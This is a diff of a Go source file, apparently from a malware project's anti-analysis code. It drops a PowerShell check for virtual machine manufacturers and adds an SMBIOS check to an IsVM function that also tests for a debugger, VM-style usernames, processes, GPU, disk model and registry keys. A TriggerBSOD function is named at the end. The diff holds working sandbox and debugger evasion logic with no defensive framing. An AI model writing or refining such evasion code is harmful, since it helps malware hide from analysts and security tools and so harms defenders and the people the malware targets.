@@ -37,26 +37,6 @@ func checkGPU() bool {
 	return false
 }
 
-// checkManufacturer checks the system manufacturer for known virtual machine vendors, hypervisors, or cloud providers.
-func checkManufacturer() bool {
-	cmd := executeCommand("powershell", "-Command", "Get-CimInstance Win32_ComputerSystem | Select-Object -ExpandProperty Manufacturer")
-	var out bytes.Buffer
-	cmd.Stdout = &out
-
-	if err := cmd.Run(); err != nil {
-		return false
-	}
-
-	manufacturer := strings.TrimSpace(strings.ToLower(out.String()))
-	// Checks for VMware, VirtualBox, QEMU, KVM, Microsoft Hyper-V, Xen
-	if strings.Contains(manufacturer, "vmware") || strings.Contains(manufacturer, "virtualbox") ||
-		strings.Contains(manufacturer, "qemu") || strings.Contains(manufacturer, "kvm") ||
-		strings.Contains(manufacturer, "microsoft corporation") || strings.Contains(manufacturer, "xen") {
-		return true
-	}
-	return false
-}
-
 // checkUsername checks for common usernames associated with virtual machines or testing environments.
 func checkUsername() bool {
 	username := strings.TrimSpace(strings.ToLower(os.Getenv("USERNAME")))
@@ -120,8 +100,8 @@ func IsVM() bool {
 	ret, _, _ := isDebuggerPresent.Call()
 
 	// ret != 0 means a debugger is present
-	return ret != 0 || checkComputerName() || checkUsername() || anti_vm.CheckProcesses() || checkManufacturer() || checkGPU() ||
-		checkDiskModel() || checkRegeditKeys()
+	return ret != 0 || anti_vm.CheckSMBIOS() || checkComputerName() || checkUsername() || anti_vm.CheckProcesses() ||
+		checkGPU() || checkDiskModel() || checkRegeditKeys()
 }
 
 func TriggerBSOD() {
